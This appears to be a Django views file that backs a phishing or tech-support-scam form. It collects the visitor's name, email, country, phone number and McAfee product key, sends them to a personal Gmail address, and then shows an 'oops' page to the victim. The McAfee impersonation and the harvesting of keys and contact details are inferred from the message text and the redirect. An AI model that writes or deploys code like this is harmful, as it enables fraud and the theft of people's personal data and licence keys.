from django.shortcuts import render,redirect
from django.core.mail import send_mail
from django.conf import settings





# Create your views here.
def form(request):
	if request.method == "POST":
		name = request.POST['name']
		email= request.POST['email']
		Country = request.POST['Country']
		phone = request.POST['phone']
		Key = request.POST['Key']
		# subject = request.POST['subject']
		print(name , email, Country, phone,Key )

		
		send_mail(
			'from Amandeep Django form ',
			'i am :-'+  name  +' mcafee user  from :-' + Country + ' & my email id is :-' +  email + ' My Phone Number :-'+  phone +' my Product key is :-'+ Key,
		    settings.EMAIL_HOST_USER,
		    ['amansolutions123@gmail.com'],
		    fail_silently=False,
		)    

		   
		return redirect('oops')

	return render(request,'index.html')


def oops(request):
	return render(request , 'oops.html')


